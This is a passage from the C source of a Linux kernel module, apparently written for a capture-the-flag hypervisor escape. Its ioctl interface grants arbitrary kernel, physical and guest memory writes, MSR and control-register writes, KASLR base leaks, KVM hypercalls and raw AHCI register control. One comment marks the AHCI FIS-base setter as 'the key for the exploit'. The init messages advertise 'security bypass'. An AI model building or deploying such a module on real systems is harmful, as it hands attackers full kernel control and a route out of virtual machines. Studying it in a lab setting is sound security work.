            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.value = native_read_msr(req.msr);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_DUMP_PAGE_TABLES: {
            struct page_table_dump dump;
            if (copy_from_user(&dump, (void __user *)arg, sizeof(dump))) return -EFAULT;
            if (dump_page_tables(dump.virtual_addr, &dump) < 0) return -EFAULT;
            return copy_to_user((void __user *)arg, &dump, sizeof(dump)) ? -EFAULT : 0;
        }
        #endif

        case IOCTL_GET_KASLR_INFO: {
            struct kaslr_info info;
            if (!g_kaslr_initialized) init_kaslr();
            info.kernel_base = g_kernel_text_base;
            info.kaslr_slide = g_kaslr_slide;
            info.physmap_base = lookup_kernel_symbol("page_offset_base");
            if (!info.physmap_base) info.physmap_base = PAGE_OFFSET;
            info.vmalloc_base = lookup_kernel_symbol("vmalloc_base");
            if (!info.vmalloc_base) info.vmalloc_base = VMALLOC_START;
            info.vmemmap_base = lookup_kernel_symbol("vmemmap_base");
            if (!info.vmemmap_base) info.vmemmap_base = (unsigned long)vmemmap;
            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
        }

        /* Memory Write Operations */
        case IOCTL_WRITE_KERNEL_MEM: {
            struct kernel_mem_write req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.kernel_addr || !req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
            ret = write_kernel_memory(req.kernel_addr, kbuf, req.length, req.force_disable_wp_flag);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_PHYSICAL_MEM: {
            struct physical_mem_write req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
            ret = write_physical_memory(req.phys_addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_PHYSICAL_PFN: {
            struct physical_mem_write req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
            ret = write_physical_via_pfn(req.phys_addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_GUEST_MEM: {
            struct guest_mem_write req;
            unsigned char *kbuf;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if ((!req.gpa && !req.gva) || !req.length || !req.user_buffer || req.length > 1024*1024) return -EINVAL;
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
            switch (req.mode) {
                case 0: ret = write_guest_memory_gpa(req.gpa, kbuf, req.length); break;
                case 2: ret = write_guest_memory_gpa(req.gpa << PAGE_SHIFT, kbuf, req.length); break;
                default: ret = -ENOSYS;
            }
            kfree(kbuf);
            return ret;
        }

        #ifdef CONFIG_X86
        case IOCTL_WRITE_MSR: {
            struct msr_write_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            return write_msr_safe_local(req.msr, req.value);
        }

        case IOCTL_WRITE_CR_REGISTER: {
            struct cr_write_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (req.cr_num < 0 || req.cr_num > 4 || req.cr_num == 1 || req.cr_num == 2) return -EINVAL;
            return write_cr_register_impl(req.cr_num, req.value, req.mask);
        }
        #endif

        case IOCTL_MEMSET_KERNEL: {
            struct memset_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.addr || !req.length || req.length > 1024*1024) return -EINVAL;
            return memset_kernel_memory_impl(req.addr, req.value, req.length);
        }

        case IOCTL_MEMSET_PHYSICAL: {
            struct memset_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.length || req.length > 1024*1024) return -EINVAL;
            return memset_physical_memory_impl(req.addr, req.value, req.length);
        }

        case IOCTL_PATCH_BYTES: {
            struct patch_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!req.addr || req.length == 0 || req.length > 32) return -EINVAL;
            return patch_memory(req.addr, req.original, req.patch, req.length, req.verify_original, req.addr_type);
        }

        /* Address Conversion Operations */
        case IOCTL_VIRT_TO_PHYS: {
            struct virt_to_phys_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            convert_virt_to_phys(req.virt_addr, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PHYS_TO_VIRT: {
            struct phys_to_virt_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            convert_phys_to_virt(req.phys_addr, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_HVA_TO_PFN: {
            struct hva_to_pfn_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            convert_hva_to_pfn(req.hva, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PFN_TO_HVA: {
            struct addr_conv_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.status = convert_pfn_to_hva(req.input_addr, &req.output_addr);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_VIRT_TO_PFN: {
            struct addr_conv_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.status = convert_virt_to_pfn(req.input_addr, &req.output_addr);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GPA_TO_GFN: {
            struct addr_conv_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.output_addr = gpa_to_gfn_local(req.input_addr); req.status = 0;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_GFN_TO_GPA: {
            struct addr_conv_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.output_addr = gfn_to_gpa_local(req.input_addr); req.status = 0;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_SPTE_TO_PFN: {
            struct spte_to_pfn_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            spte_to_pfn_local(req.spte, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_WALK_EPT: {
            struct ept_walk_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            walk_ept_tables(req.eptp, req.gpa, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_TRANSLATE_GVA: {
            struct gva_translate_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            translate_gva_to_gpa(req.gva, req.cr3, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PAGE_TO_PFN: {
            struct addr_conv_request req;
            struct page *page;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            page = (struct page *)req.input_addr;
            if (!virt_addr_valid(page)) req.status = -EINVAL;
            else { req.output_addr = page_to_pfn(page); req.status = 0; }
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PFN_TO_PAGE: {
            struct addr_conv_request req;
            struct page *page;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (!pfn_valid(req.input_addr)) req.status = -EINVAL;
            else { page = pfn_to_page(req.input_addr); req.output_addr = (unsigned long)page; req.status = page ? 0 : -EFAULT; }
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GFN_TO_HVA: {
            struct gfn_to_hva_request req;
            unsigned long gpa;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            gpa = gfn_to_gpa_local(req.gfn);
            if (gpa < (1ULL << 40)) { req.hva = (unsigned long)__va(gpa); req.status = virt_addr_valid(req.hva) ? 0 : -EFAULT; }
            else req.status = -EINVAL;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GFN_TO_PFN: {
            struct gfn_to_pfn_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.pfn = req.gfn; req.status = 0;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_GPA_TO_HVA: {
            struct gpa_to_hva_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.gfn = gpa_to_gfn_local(req.gpa);
            if (req.gpa < (1ULL << 40)) { req.hva = (unsigned long)__va(req.gpa); req.status = virt_addr_valid(req.hva) ? 0 : -EFAULT; }
            else req.status = -EINVAL;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_HVA_TO_GFN: {
            struct addr_conv_request req;
            unsigned long phys;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            if (virt_addr_valid(req.input_addr)) { phys = virt_to_phys((void *)req.input_addr); req.output_addr = phys >> PAGE_SHIFT; req.status = 0; }
            else req.status = -EFAULT;
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        /* Hypercall Operations */
        case IOCTL_HYPERCALL: {
            #ifdef CONFIG_X86
            struct hypercall_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
            req.ret = do_kvm_hypercall(req.nr, req.a0, req.a1, req.a2, req.a3);
            if (req.ret != 0 && req.ret != ~0UL)
                printk(KERN_INFO "%s: Hypercall %lu returned 0x%lx\n", DRIVER_NAME, req.nr, req.ret);
            if (copy_to_user((void __user *)arg, &req, sizeof(req))) return -EFAULT;
            return 0;
            #else
            return -ENOSYS;
            #endif
        }

        case IOCTL_HYPERCALL_BATCH: {
            #ifdef CONFIG_X86
            struct hypercall_batch_result result;
            run_ctf_hypercalls_batch(&result);
            if (copy_to_user((void __user *)arg, &result, sizeof(result))) return -EFAULT;
            return 0;
            #else
            return -ENOSYS;
            #endif
        }

        /* Cache Operations */
        case IOCTL_WBINVD: {
            #ifdef CONFIG_X86
            printk(KERN_INFO "%s: IOCTL_WBINVD - flushing all caches\n", DRIVER_NAME);
            wbinvd_all_cpus();
            return 0;
            #else
            return -ENOSYS;
            #endif
        }

        case IOCTL_CLFLUSH: {
            #ifdef CONFIG_X86
            struct clflush_request req;
            void *addr;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (req.use_phys) {
                addr = __va(req.phys_addr);
            } else {
                addr = (void *)req.virt_addr;
            }

            printk(KERN_INFO "%s: IOCTL_CLFLUSH - flushing addr %p\n", DRIVER_NAME, addr);
            
            if (virt_addr_valid((unsigned long)addr)) {
                clflush_addr(addr);
                do_mfence();
            } else {
                printk(KERN_WARNING "%s: Address %p not valid for CLFLUSH\n", DRIVER_NAME, addr);
                return -EFAULT;
            }
            
            return 0;
            #else
            return -ENOSYS;
            #endif
        }

        case IOCTL_WRITE_AND_FLUSH: {
            #ifdef CONFIG_X86
            struct write_flush_request req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.size || !req.buffer || req.size > 1024 * 1024) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.size, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, (void __user *)req.buffer, req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            ret = write_physical_and_flush(req.phys_addr, kbuf, req.size);
            kfree(kbuf);
            return ret;
            #else
            return -ENOSYS;
            #endif
        }

        /* AHCI Direct Access */
        case IOCTL_AHCI_INIT: {
            return ahci_map_mmio();
        }

        case IOCTL_AHCI_READ_REG: {
            struct ahci_reg_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (ahci_map_mmio() < 0) {
                return -EIO;
            }

            if (req.port < 6) {
                req.value = ahci_read32(AHCI_PORT_BASE(req.port) + req.offset);
            } else {
                req.value = ahci_read32(req.offset);
            }

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_AHCI_WRITE_REG: {
            struct ahci_reg_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (ahci_map_mmio() < 0) {
                return -EIO;
            }

            if (req.port < 6) {
                ahci_write32(AHCI_PORT_BASE(req.port) + req.offset, req.value);
            } else {
                ahci_write32(req.offset, req.value);
            }

            printk(KERN_INFO "%s: AHCI write port %d offset 0x%x = 0x%x\n",
                   DRIVER_NAME, req.port, req.offset, req.value);
            return 0;
        }

        case IOCTL_AHCI_SET_FIS_BASE: {
            struct ahci_fis_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (ahci_map_mmio() < 0) {
                return -EIO;
            }

            if (req.port >= 6) {
                return -EINVAL;
            }

            /* Set FIS base - this is the key for the exploit! */
            ahci_set_fis_base(req.port, req.fis_base);
            
            if (req.clb_base) {
                ahci_set_clb(req.port, req.clb_base);
            }

            return 0;
        }

        case IOCTL_AHCI_INFO: {
            struct ahci_info info;

            if (ahci_map_mmio() < 0) {
                return -EIO;
            }

            info.cap = ahci_read32(0x00);
            info.ghc = ahci_read32(0x04);
            info.pi = ahci_read32(0x0C);
            info.vs = ahci_read32(0x10);

            for (int i = 0; i < 6; i++) {
                info.port_ssts[i] = ahci_get_port_status(i);
            }

            printk(KERN_INFO "%s: AHCI CAP=0x%x GHC=0x%x PI=0x%x VS=0x%x\n",
                   DRIVER_NAME, info.cap, info.ghc, info.pi, info.vs);

            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
        }

        default:
            return -ENOTTY;
    }

    return 0;
}

/* File Operations */
static int driver_open(struct inode *inode, struct file *file) { return 0; }
static int driver_release(struct inode *inode, struct file *file) { return 0; }

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = driver_open,
    .release = driver_release,
    .unlocked_ioctl = driver_ioctl,
    .compat_ioctl = driver_ioctl,
};

/* Module Init/Exit */
static int __init mod_init(void)
{
    printk(KERN_INFO "%s: Initializing v2.2 (Enhanced security bypass)\n", DRIVER_NAME);
    kallsyms_lookup_init();
    init_kaslr();
    init_symbol_database();

    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0) return major_num;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    driver_class = class_create(DRIVER_NAME);
    #else
    driver_class = class_create(THIS_MODULE, DRIVER_NAME);
    #endif
    if (IS_ERR(driver_class)) { unregister_chrdev(major_num, DEVICE_FILE_NAME); return PTR_ERR(driver_class); }

    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) { class_destroy(driver_class); unregister_chrdev(major_num, DEVICE_FILE_NAME); return PTR_ERR(driver_device); }

    printk(KERN_INFO "%s: /dev/%s created. Auto-security bypass enabled.\n", DRIVER_NAME, DEVICE_FILE_NAME);
    return 0;
}

static void __exit mod_exit(void)
{
    ahci_unmap_mmio();
    if (driver_device) device_destroy(driver_class, MKDEV(major_num, 0));
    if (driver_class) class_destroy(driver_class);
    if (major_num >= 0) unregister_chrdev(major_num, DEVICE_FILE_NAME);
    printk(KERN_INFO "%s: Unloaded\n", DRIVER_NAME);
}

module_init(mod_init);
module_exit(mod_exit);